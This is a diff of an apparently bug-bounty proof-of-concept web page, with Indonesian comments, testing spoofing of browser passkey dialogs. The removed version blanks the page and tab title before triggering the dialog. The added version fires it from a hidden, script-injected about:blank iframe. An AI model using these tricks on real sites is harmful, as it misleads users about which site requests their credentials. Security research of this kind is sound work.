@@ -3,90 +3,79 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Passkey UI Bug Bounty PoC - Blank Redirect</title>
-    <style>
-        body { font-family: sans-serif; padding: 20px; text-align: center; transition: opacity 0.2s; }
-        button { padding: 15px 25px; font-size: 16px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 5px; }
-        #log { margin-top: 20px; color: #333; font-family: monospace; white-space: pre-wrap; text-align: left; background: #f4f4f4; padding: 10px; border-radius: 5px; }
-        
-        /* CSS untuk efek blank screen */
-        .blank-screen {
-            background-color: #ffffff !important; /* Warna putih */
-            color: #ffffff !important; /* Sembunyikan teks */
-            overflow: hidden;
-        }
-        .hide-content { display: none !important; }
-    </style>
+    <title>PoC Passkey - about:blank Origin</title>
 </head>
 <body>
-
-    <div id="main-content">
-        <h2>Uji Coba Dialog Passkey</h2>
-        <p>Klik tombol di bawah ini. Layar akan menjadi blank sejenak, lalu popup Passkey akan muncul.</p>
-        <button id="registerBtn">Buat Passkey (Trigger Dialog)</button>
-        <div id="log">Menunggu interaksi...</div>
-    </div>
+    <h2>Uji Coba Spoofing Domain (about:blank)</h2>
+    <p>Klik tombol di bawah. Script akan membuat iframe <code>about:blank</code>, lalu memicu dialog Passkey dari dalam iframe tersebut.</p>
+    
+    <button id="triggerBtn" style="padding: 15px; font-size: 16px;">Picu Passkey dari about:blank</button>
+    
+    <div id="log" style="margin-top: 20px; font-family: monospace; background: #f4f4f4; padding: 10px;"></div>
 
     <script>
-        const btn = document.getElementById('registerBtn');
         const logDiv = document.getElementById('log');
-        const mainContent = document.getElementById('main-content');
+        function log(msg) { logDiv.innerHTML += "<br>> " + msg; }
 
-        btn.addEventListener('click', async () => {
-            // --- TRIK 1: MEMBUAT LAYAR BLANK ---
-            // Sembunyikan semua konten HTML agar layar terlihat kosong
-            mainContent.classList.add('hide-content');
-            document.body.classList.add('blank-screen');
+        document.getElementById('triggerBtn').addEventListener('click', () => {
+            logDiv.innerHTML = "Membuat iframe about:blank...";
 
-            // Opsional: Ubah judul tab menjadi kosong untuk mengecoh
-            document.title = " ";
+            // 1. Buat iframe dengan src about:blank
+            // Karena iframe tanpa src (atau about:blank) mewarisi origin dari parent (halaman ini)
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none'; // Sembunyikan iframe agar tidak terlihat
+            
+            // 2. Tambahkan iframe ke DOM (wajib agar script bisa berjalan)
+            document.body.appendChild(iframe);
 
-            // Beri jeda sedikit (misal 100ms) agar browser sempat merender layar blank
-            // sebelum popup sistem muncul
-            setTimeout(async () => {
+            // 3. Tunggu iframe siap, lalu suntikkan script WebAuthn ke dalamnya
+            iframe.onload = () => {
+                log("Iframe siap. Menyuntikkan script WebAuthn...");
                 
-                const publicKeyCredentialCreationOptions = {
-                    challenge: Uint8Array.from("random_challenge_string_12345", c => c.charCodeAt(0)),
-                    rp: {
-                        name: "PoC Bug Bounty",
-                        // JANGAN isi id jika ingin menggunakan domain saat ini
-                    },
-                    user: {
-                        id: Uint8Array.from("user_id_123", c => c.charCodeAt(0)),
-                        name: "test@example.com",
-                        displayName: "Test User"
-                    },
-                    pubKeyCredParams: [
-                        { alg: -7, type: "public-key" }, 
-                        { alg: -257, type: "public-key" }
-                    ],
-                    authenticatorSelection: {
-                        authenticatorAttachment: "platform",
-                        userVerification: "required",
-                        residentKey: "required"
-                    },
-                    timeout: 60000,
-                    attestation: "none"
-                };
+                const iframeDoc = iframe.contentWindow.document;
+                const script = iframeDoc.createElement('script');
+                
+                // Script ini akan dieksekusi DI DALAM konteks iframe (about:blank)
+                script.textContent = `
+                    async function triggerPasskey() {
+                        try {
+                            // Perhatikan: Kita tidak mendefinisikan 'rp.id' secara eksplisit.
+                            // Browser akan mencoba mengambil origin dari context saat ini (about:blank).
+                            const cred = await navigator.credentials.create({
+                                publicKey: {
+                                    challenge: new Uint8Array([1, 2, 3, 4]),
+                                    rp: { name: "PoC Bug Bounty" }, 
+                                    user: {
+                                        id: new Uint8Array([5, 6, 7, 8]),
+                                        name: "test",
+                                        displayName: "test"
+                                    },
+                                    pubKeyCredParams: [{ type: "public-key", alg: -7 }],
+                                    authenticatorSelection: { authenticatorAttachment: "platform" }
+                                }
+                            });
+                            // Kirim hasil kembali ke parent
+                            window.parent.postMessage("SUKSES", "*");
+                        } catch (e) {
+                            // Jika error, kirim pesan error ke parent
+                            window.parent.postMessage("ERROR: " + e.name + " - " + e.message, "*");
+                        }
+                    }
+                `;
+                iframeDoc.head.appendChild(script);
+                
+                // 4. Panggil fungsi di dalam iframe
+                log("Memicu navigator.credentials.create() dari about:blank...");
+                iframe.contentWindow.triggerPasskey();
+            };
 
-                try {
-                    // --- TRIK 2: TRIGGER POPUP SAAT LAYAR BLANK ---
-                    const credential = await navigator.credentials.create({
-                        publicKey: publicKeyCredentialCreationOptions
-                    });
-                    
-                    // Jika sukses, kembalikan layar (opsional)
-                    document.body.classList.remove('blank-screen');
-                    mainContent.classList.remove('hide-content');
-                    logDiv.innerText = "Sukses! Passkey berhasil dibuat.";
-                    
-                } catch (err) {
-                    // Jika error/batal, kembalikan layar
-                    document.body.classList.remove('blank-screen');
-                    mainContent.classList.remove('hide-content');
-                    logDiv.innerText = "Error atau Dibatalkan: " + err.name + " - " + err.message;
-                }
-            }, 100); // Jeda 100 milidetik
+            // 5. Tangkap pesan balik dari iframe
+            window.addEventListener('message', (event) => {
+                log("Respon dari iframe: " + event.data);
+            });
+            
+            // Ganti src menjadi about:blank setelah disisipkan ke DOM (trik lama)
+            iframe.src = "about:blank";
         });
     </script>
 </body>
